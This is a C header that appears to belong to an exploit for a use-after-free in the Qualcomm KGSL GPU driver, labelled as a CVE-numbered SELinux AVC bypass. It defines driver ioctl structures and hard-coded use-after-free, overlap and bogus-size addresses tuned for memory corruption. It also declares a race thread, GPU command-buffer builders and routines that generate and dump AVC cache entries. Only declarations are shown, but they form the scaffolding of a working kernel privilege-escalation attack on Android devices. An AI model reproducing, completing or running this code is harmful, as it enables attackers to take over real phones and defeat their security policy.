#ifndef AVC_BYPASS_H
#define AVC_BYPASS_H

#include <stdint.h>

#define KGSL_IOC_TYPE 0x09

struct kgsl_gpuobj_alloc {
    uint64_t size;
    uint64_t flags;
    uint64_t va_len;
    uint64_t mmapsize;
    unsigned int id;
    unsigned int metadata_len;
    uint64_t metadata;
};
#define IOCTL_KGSL_GPUOBJ_ALLOC _IOWR(KGSL_IOC_TYPE, 0x45, struct kgsl_gpuobj_alloc)

struct kgsl_gpuobj_free {
    uint64_t flags;
    uint64_t priv;
    unsigned int id;
    unsigned int type;
    unsigned int len;
    unsigned int __pad;
};
#define IOCTL_KGSL_GPUOBJ_FREE _IOW(KGSL_IOC_TYPE, 0x46, struct kgsl_gpuobj_free)

struct kgsl_gpuobj_info {
    uint64_t gpuaddr, flags, size, va_len, va_addr;
    unsigned int id;
};
#define IOCTL_KGSL_GPUOBJ_INFO _IOWR(KGSL_IOC_TYPE, 0x47, struct kgsl_gpuobj_info)

struct kgsl_gpuobj_import {
    uint64_t priv;
    uint64_t priv_len;
    uint64_t flags;
    unsigned int type;
    unsigned int id;
};
#define IOCTL_KGSL_GPUOBJ_IMPORT _IOWR(KGSL_IOC_TYPE, 0x48, struct kgsl_gpuobj_import)

struct kgsl_gpuobj_import_useraddr {
    uint64_t virtaddr;
};

struct kgsl_drawctxt_create {
    unsigned int flags;
    unsigned int drawctxt_id;
};
#define IOCTL_KGSL_DRAWCTXT_CREATE _IOWR(KGSL_IOC_TYPE, 0x13, struct kgsl_drawctxt_create)

struct kgsl_command_object {
    uint64_t offset;
    uint64_t gpuaddr;
    uint64_t size;
    unsigned int flags;
    unsigned int id;
};

struct kgsl_gpu_command {
    uint64_t flags;
    uint64_t cmdlist;
    unsigned int cmdsize, numcmds;
    uint64_t objlist;
    unsigned int objsize, numobjs;
    uint64_t synclist;
    unsigned int syncsize, numsyncs;
    unsigned int context_id, timestamp;
};
#define IOCTL_KGSL_GPU_COMMAND _IOWR(KGSL_IOC_TYPE, 0x4A, struct kgsl_gpu_command)

struct kgsl_cmdstream_readtimestamp_ctxtid {
    unsigned int context_id, type, timestamp;
};
#define IOCTL_KGSL_CMDSTREAM_READTIMESTAMP_CTXTID _IOWR(KGSL_IOC_TYPE, 0x16, struct kgsl_cmdstream_readtimestamp_ctxtid)

#define KGSL_MEMFLAGS_USE_CPU_MAP (1ULL << 28)
#define KGSL_CACHEMODE_MASK 3
#define KGSL_CACHEMODE_WRITEBACK 3
#define KGSL_USER_MEM_TYPE_ADDR 2
#define KGSL_CONTEXT_PREAMBLE 0x00000010
#define KGSL_CONTEXT_NO_GMEM_ALLOC 0x00000002
#define KGSL_CMDLIST_IB 0x00000001U
#define KGSL_TIMESTAMP_RETIRED 0x00000002

#define UAF_ADDR  0x7001ff000ULL
#define UAF_SIZE  0x10004000ULL
#define OVERLAP_ADDR 0x7001fe000ULL
#define OVERLAP_SIZE 0x7000ULL
#define BOGUS_ADDR 0x700204000ULL
#define BOGUS_SIZE 0xffffffffffefd000ULL
#define PLACEHOLDER_ADDR 0x710204000ULL
#define PLACEHOLDER_SIZE 0x10400000ULL

#define SCAN_DWORDS 1024
#define N_AVC_CHILD 10


extern int kgsl_fd;
extern volatile int race_done;

void die(const char *msg);
void split64(uint64_t addr, uint32_t *lo, uint32_t *hi);
uint32_t pm4_parity(uint32_t v);
uint32_t cp_type7(uint32_t opcode, uint32_t cnt);

int gpuobj_alloc(int fd, uint64_t size, uint64_t flags);
void *gpuobj_mmap(int fd, size_t size, unsigned int id);
int gpuobj_info(int fd, unsigned int id, uint64_t *gpuaddr);
void gpuobj_free(int fd, unsigned int id);
unsigned int create_context(int fd);
int wait_timestamp(int fd, unsigned int ctx_id, unsigned int target);
int submit_ib(int fd, unsigned int ctx_id, uint64_t ib_ga, size_t bytes, unsigned int ib_id, unsigned int *out_ts);

void *race_thread(void *arg);
void gen_avc_entries(void);
void dump_avc_page(uint64_t va, uint32_t *d, int n_slots);

int main(int argc, char **argv);

#endif /* CVE33107_AVC_BYPASS_H */
